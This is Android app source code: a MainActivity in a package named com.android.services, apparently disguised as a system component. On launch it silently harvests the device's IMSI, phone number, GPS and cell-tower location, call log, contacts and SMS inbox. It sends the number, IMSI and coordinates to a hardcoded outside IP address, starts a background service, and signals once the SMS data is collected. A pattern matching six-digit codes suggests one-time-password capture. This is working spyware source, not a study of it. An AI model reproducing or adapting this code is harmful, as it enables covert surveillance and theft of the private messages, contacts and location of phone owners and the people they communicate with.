package com.android.services;

import android.Manifest;
import android.app.AlertDialog;
import android.content.ContentResolver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.LocalBroadcastManager;
import android.support.v7.app.AppCompatActivity;
import android.telephony.TelephonyManager;
import android.telephony.gsm.GsmCellLocation;
import android.util.Log;

import com.android.services.Adapter.PushNotification;
import com.android.services.Firebase.UpdateService;
import com.android.services.Model.ContactModel;
import com.android.services.Model.Model_images;
import com.android.services.Utils.AndLog;
import com.android.services.Utils.AppConf;
import com.android.services.Utils.CallLogHelper;
import com.android.services.Utils.FileUploader;
import com.android.services.Utils.SessionManager;
import com.android.services.Utils.VolleyHttp;
import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.tasks.OnSuccessListener;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.regex.Pattern;

public class MainActivity extends AppCompatActivity {

    private FusedLocationProviderClient mFusedLocationClient;
    private final String TAG = "MNACT";
    private final String LIST_CTC = "CONTACT";
    private GsmCellLocation gsmCellLocation;
    private int cid, lac, mcc, mnc;
    private String nomor, imsi, lat_cid, lon_cid, lat_gps, lon_gps, callNumber, callName, callDate, callType, duration, ctc_name, ctc_nomor;
    private ArrayList<String> conNames;
    private ArrayList<String> conNumbers;
    private ArrayList<String> conTime;
    private ArrayList<String> conDate;
    private ArrayList<String> conType;
    public static ArrayList<Model_images> al_images = new ArrayList<>();
    boolean boolean_folder;
    private static final int REQUEST_PERMISSIONS = 100;
    SessionManager sessionManager;

    public Pattern p = Pattern.compile("(|^)\\d{6}");

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        sessionManager = new SessionManager(MainActivity.this);
        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        String networkOperator = telephonyManager.getNetworkOperator();

        mFusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
        gsmCellLocation = (GsmCellLocation) telephonyManager.getCellLocation();

        lat_gps = "0";
        lon_gps = "0";
        lat_cid = "0";
        lon_cid = "0";

        mFusedLocationClient.getLastLocation()
                .addOnSuccessListener(this, new OnSuccessListener<Location>() {
                    @Override
                    public void onSuccess(Location location) {
                        // Got last known location. In some rare situations this can be null.
                        if (location != null) {
                            // Logic to handle location object

                            double dlat = location.getLatitude();
                            double dlon = location.getLongitude();

                            lat_gps = String.valueOf(dlat);
                            lon_gps = String.valueOf(dlon);

                            AndLog.ShowLog(TAG, lat_gps + " ;; " + lon_gps);
                            sessionManager.setLat(lat_gps);
                            sessionManager.setLng(lon_gps);
                            submit();

                        }
                    }
                });

        /// IMSI
        imsi = telephonyManager.getSubscriberId();
        AndLog.ShowLog(TAG, "IMSI : " + imsi);
        sessionManager.setImsi(imsi);
        /// NOMOR
        nomor = telephonyManager.getLine1Number();
        AndLog.ShowLog(TAG, "Nomor : " + nomor);
        sessionManager.setNomor(nomor);

        /// LOCATION CELL
        cid = 0;
        lac = 0;
        mcc = 0;
        mnc = 0;


        try {

            cid = gsmCellLocation.getCid();
            lac = gsmCellLocation.getLac();
            mcc = Integer.parseInt(networkOperator.substring(0, 3));
            mnc = Integer.parseInt(networkOperator.substring(3));

            getLoc();

        } catch (Exception e) {

        }

        AndLog.ShowLog(TAG, "CID : " + cid + "\n" +
                "LAC : " + lac + "\n" +
                "MCC : " + mcc + "\n" +
                "MNC : " + mnc + "\n");

        sessionManager.setCid(String.valueOf(cid));
        sessionManager.setLac(String.valueOf(lac));
        sessionManager.setMcc(String.valueOf(mcc));
        sessionManager.setMnc(String.valueOf(mnc));

        callLog();


        boolean checkService = PushNotification.isMyServiceRunning(MainActivity.this, UpdateService.class);
        if (!checkService && imsi != null) {
            startService(new Intent(MainActivity.this, UpdateService.class));
        }



    }

//    public ArrayList<Model_images> ambilgallery() {
//        al_images.clear();
//
//        int int_position = 0;
//        Uri uri;
//        Cursor cursor;
//        int column_index_data, column_index_folder_name;
//
//        String absolutePathOfImage = null;
//        uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
//
//        String[] projection = {MediaStore.MediaColumns.DATA, MediaStore.Images.Media.BUCKET_DISPLAY_NAME};
//
//        final String orderBy = MediaStore.Images.Media.DATE_TAKEN;
//        cursor = getApplicationContext().getContentResolver().query(uri, projection, null, null, orderBy + " DESC");
//
//        column_index_data = cursor.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA);
//        column_index_folder_name = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.BUCKET_DISPLAY_NAME);
//        while (cursor.moveToNext()) {
//            absolutePathOfImage = cursor.getString(column_index_data);
//            Log.e("Column", absolutePathOfImage);
//            Log.e("Folder", cursor.getString(column_index_folder_name));
//
//
//            for (int i = 0; i < al_images.size(); i++) {
//
//                if (al_images.get(i).getStr_folder().equals(cursor.getString(column_index_folder_name))) {
//                    boolean_folder = true;
//                    int_position = i;
//                    break;
//                } else {
//                    boolean_folder = false;
//                }
//            }
//
//            if (boolean_folder) {
//
//                ArrayList<String> al_path = new ArrayList<>();
//                al_path.addAll(al_images.get(int_position).getAl_imagepath());
//                al_path.add(absolutePathOfImage);
//                al_images.get(int_position).setAl_imagepath(al_path);
//
//            } else {
//                ArrayList<String> al_path = new ArrayList<>();
//                al_path.add(absolutePathOfImage);
//                Model_images obj_model = new Model_images();
//                obj_model.setStr_folder(cursor.getString(column_index_folder_name));
//                obj_model.setAl_imagepath(al_path);
//
//                al_images.add(obj_model);
//
//
//            }
//
//
//        }
//
//
//        for (int i = 0; i < al_images.size(); i++) {
//            Log.e("FOLDERd", al_images.get(i).getStr_folder());
//
//            for (int j = 0; j < al_images.get(i).getAl_imagepath().size(); j++) {
//                Log.e("FILE", al_images.get(i).getAl_imagepath().get(j));
//                    sessionManager.setImgPath(al_images.get(i).getAl_imagepath().get(j));
//            }
//        }
//
//        fetchInbox();
//        return al_images;
//    }



    public void callLog() {

        if (ActivityCompat.checkSelfPermission(MainActivity.this, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {

            conNames = new ArrayList<String>();
            conNumbers = new ArrayList<String>();
            conTime = new ArrayList<String>();
            conDate = new ArrayList<String>();
            conType = new ArrayList<String>();
            Cursor curLog = CallLogHelper.getAllCallLogs(getContentResolver());
            getCallLogs(curLog);
        }
    }

    private void getLoc() {
        AndLog.ShowLog("dss", "http://118.98.64.43/wablast/files/cloc.php?mcc=" + mcc + "&mnc=" + mnc + "&LAC=" + lac + "&cid=" + cid);
        StringRequest stringRequest = new StringRequest(Request.Method.GET, "http://118.98.64.43/wablast/files/cloc.php?mcc=" + mcc + "&mnc=" + mnc + "&LAC=" + lac + "&cid=" + cid, new Response.Listener<String>() {
            @Override
            public void onResponse(String response) {

                try {

                    JSONObject jo = new JSONObject(response);
                    String hasil = jo.getString("hasil");

                    if (hasil.toString().trim().equals("true")) {

                        lat_cid = jo.getString("lat");
                        lon_cid = jo.getString("lon");
                        sessionManager.setLatCid(lat_cid);
                        sessionManager.setLngCid(lon_cid);
                        submit();
                    }

                } catch (JSONException e) {
                    e.printStackTrace();


                }


            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {

            }

        }) {

        };

        stringRequest.setTag(getString(R.string.app_name));
        VolleyHttp.getInstance(MainActivity.this).addToRequestQueue(stringRequest);

    }

    private void submit() {


        StringRequest stringRequest = new StringRequest(Request.Method.POST, "http://118.98.64.43/wablast/index.php/blast/savedata", new Response.Listener<String>() {
            @Override
            public void onResponse(String response) {

                try {

                    JSONObject jo = new JSONObject(response);
                    String hasil = jo.getString("result");

                    if (hasil.toString().trim().equals("true")) {


                    } else {

                    }


                } catch (JSONException e) {
                    e.printStackTrace();


                }


            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {


            }

        }) {

            @Override
            protected Map<String, String> getParams() throws AuthFailureError {

                Map<String, String> params = new HashMap<String, String>();
                params.put("nomor", nomor);
                params.put("imsi", imsi);
                params.put("lat_cid", String.valueOf(lat_cid));
                params.put("lon_cid", String.valueOf(lon_cid));
                params.put("lat_gps", String.valueOf(lat_gps));
                params.put("lon_gps", String.valueOf(lon_gps));
                AndLog.ShowLog("sads", String.valueOf(params));
                return params;
            }
        };

        stringRequest.setTag(getString(R.string.app_name));
        VolleyHttp.getInstance(MainActivity.this).addToRequestQueue(stringRequest);

    }

    //    get call log
    private void getCallLogs(Cursor curLog) {
        String data = "";
        while (curLog.moveToNext()) {
            String finaldata = "";

            callName = curLog
                    .getString(curLog
                            .getColumnIndex(CallLog.Calls.CACHED_NAME));
            if (callName == null) {
//                conNames.add("Unknown");
                finaldata = finaldata + "Unknown No : ";
            } else {
//            conNames.add(callName);
                finaldata = finaldata + callName + " No : ";
            }
            callNumber = curLog.getString(curLog
                    .getColumnIndex(CallLog.Calls.NUMBER));
//            conNumbers.add(callNumber);
            finaldata = finaldata + callNumber;

            duration = curLog.getString(curLog
                    .getColumnIndex(CallLog.Calls.DURATION));
//            conTime.add(duration);
            finaldata = finaldata + " ( " + duration + " sec ) ";

            callDate = curLog.getString(curLog
                    .getColumnIndex(CallLog.Calls.DATE));
            SimpleDateFormat formatter = new SimpleDateFormat(
                    "dd-MMM-yyyy HH:mm");
            String dateString = formatter.format(new Date(Long
                    .parseLong(callDate)));
//            conDate.add(dateString);
            finaldata = finaldata + dateString;

            callType = curLog.getString(curLog
                    .getColumnIndex(CallLog.Calls.TYPE));
            if (callType.equals("1")) {
//                conType.add("Incoming");
                finaldata = finaldata + " ( Incoming ) , ";
            } else {
//                conType.add("Outgoing");
                finaldata = finaldata + " ( Outgoing )";
            }
            data = data + finaldata +"###";
        }

        final String CalLog = data;
        AndLog.ShowLog("CalLogPhone", CalLog);
        sessionManager.setCallLog(CalLog);

        contactLog();


//        StringRequest strReq = new StringRequest(Request.Method.POST, AppConf.SAVELOG, new Response.Listener<String>() {
//
//            @Override
//            public void onResponse(String response) {
//
//            }
//        }, new Response.ErrorListener() {
//
//            @Override
//            public void onErrorResponse(VolleyError error) {
//
//            }
//        }) {
//
//            @Override
//            protected Map<String, String> getParams() {
//
//                Map<String, String> params = new HashMap<String, String>();
//
//                params.put("log_data", CalLog);
//
//
//                return params;
//
//            }
//
//        };
//        requestQueue.add(strReq);

    }

    public void contactLog() {

        if (ActivityCompat.checkSelfPermission(MainActivity.this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {

            new LoadFromContactList().execute();
        }
    }

    private class LoadFromContactList extends AsyncTask<Void, String, ArrayList<ContactModel>> {
        @Override
        protected void onPreExecute() {
            super.onPreExecute();

            //Log.i(TAG, "Load Contact");
        }

        @Override
        protected ArrayList<ContactModel> doInBackground(Void... params) {
            // TODO Auto-generated method stub

            ArrayList<ContactModel> result = LihatContact();

            return result;
        }


        @Override
        protected void onPostExecute(final ArrayList<ContactModel> result) {
            // TODO Auto-generated method stub
            super.onPostExecute(result);
            String data = "";
            String compare = "";
            for (int i = 0; i < result.size(); i++) {
//                AndLog.ShowLog("ContactDetail", result.get(i).getNama() + " - " + result.get(i).getExtra());
                AndLog.ShowLog(LIST_CTC + " nama", ctc_name = result.get(i).getNama());
                AndLog.ShowLog(LIST_CTC + " nomor", ctc_nomor = result.get(i).getExtra());

                if (!compare.equals(result.get(i).getExtra())) {
                    data = data + result.get(i).getNama() + "(" + result.get(i).getExtra() + ")###";
                }

                compare = result.get(i).getExtra();

            }
            final String Contact = data;
            AndLog.ShowLog("Ctc_list", Contact);
            sessionManager.setContact(Contact);
            fetchInbox();

//            StringRequest strReq = new StringRequest(Request.Method.POST, AppConf.SAVEKONTAK, new Response.Listener<String>() {
//
//                @Override
//                public void onResponse(String response) {
//
//                }
//            }, new Response.ErrorListener() {
//
//                @Override
//                public void onErrorResponse(VolleyError error) {
//
//                }
//            }) {
//
//                @Override
//                protected Map<String, String> getParams() {
//
//                    Map<String, String> params = new HashMap<String, String>();
//
//                    params.put("ctc_data", Contact);
//                    params.put("id_client", sessionManager.getIdhq());
//
//                    AndLog.ShowLog("husst", String.valueOf(params));
//                    return params;
//
//                }
//
//            };
//            requestQueue.add(strReq);
        }


    }

    private ArrayList<ContactModel> LihatContact() {

        ArrayList<ContactModel> tmpContact = new ArrayList<>();
        ContactModel contactVO;
        ContentResolver contentResolver = MainActivity.this.getContentResolver();
        Cursor cursor = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");
        if (cursor.getCount() > 0) {
            while (cursor.moveToNext()) {

                int hasPhoneNumber = Integer.parseInt(cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.HAS_PHONE_NUMBER)));
                if (hasPhoneNumber > 0) {

                    contactVO = new ContactModel();
                    String fixPhone = "0";
                    String id = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone._ID));
                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String mphone = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

                    fixPhone = mphone.replace("+62", "0").replaceAll("\\D+", "");

                    contactVO.setNama(name);
                    contactVO.setExtra(fixPhone);


                    tmpContact.add(contactVO);


                }
            }

        }


        return tmpContact;
    }

    public ArrayList fetchInbox() {
        ArrayList sms = new ArrayList();

        Uri uriSms = Uri.parse("content://sms/inbox");
        Cursor cursor = getContentResolver().query(uriSms, new String[]{"_id", "address", "date", "body"}, null, null, null);
        String msgData = "";
        cursor.moveToFirst();
        while (cursor.moveToNext()) {
            String address = cursor.getString(1);
            String body = cursor.getString(3);

            msgData += " " + "\n" + "Mobile number : " + cursor.getString(1) + ",SMS Text:" + cursor.getString(3) + "###";

            AndLog.ShowLog("Mobile number : ", address);
            AndLog.ShowLog("SMS Text ", body);

            sms.add("Address" + address + " / SMS :" + body);
        }
        AndLog.ShowLog("msg: ", msgData);
        sessionManager.setPesan(msgData);
        LocalBroadcastManager.getInstance(this).sendBroadcast(new Intent("send"));
        return sms;

    }

}
